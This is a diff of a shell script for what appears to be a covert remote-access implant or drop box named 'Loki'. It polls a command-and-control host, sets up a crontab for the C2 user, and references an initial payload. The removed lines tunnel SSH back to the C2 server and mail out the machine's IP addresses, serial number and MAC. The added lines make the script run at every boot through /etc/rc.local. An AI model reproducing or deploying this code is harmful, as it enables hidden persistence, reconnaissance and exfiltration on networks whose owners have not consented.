@@ -58,20 +58,6 @@ until curl -Is $C2PROTO$C2
   done
 $LOG "Network Up"
 
-$SSH -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -N -f -C
-WAN_IP=$(curl ifconfig.me)
-SERIAL=$(dmidecode -s system-serial-number)
-UPTIME=$(uptime)
-
-echo "LAN IP = $LAN_IP " > $LOKIHOME/netinfo
-echo "WAN IP = $WAN_IP" >> $LOKIHOME/netinfo
-
-echo "===========================" >> $LOKIHOME/netinfo
-echo "Serial = $SERIAL" >> $LOKIHOME/netinfo
-echo "MAC = $MAC" >> $LOKIHOME/netinfo
-echo "Uptime = $UPTIME" >> $LOKIHOME/netinfo
-
-mail -s "PSA ONLINE" $DESTEMAIL < $LOKIHOME/netinfo
 
 # Check for the Loki Home Directory
 if ! [ -d "$LOKIHOME" ]; then 
@@ -101,11 +87,10 @@ if [ $? == 1 ]; then
   $CHMOD 600 /var/spool/cron/crontabs/$C2USER
 fi
 
-
-# Check for required files
-
-# check for network connection
-
+$ECHO $LOKIHOME/onboot.sh >> /etc/rc.local
+$CHMOD +X /etc/rc.local 
+# We should have everything setup now.  
+$LOKIHOME/onboot.sh
 
 
 # Run initial payload
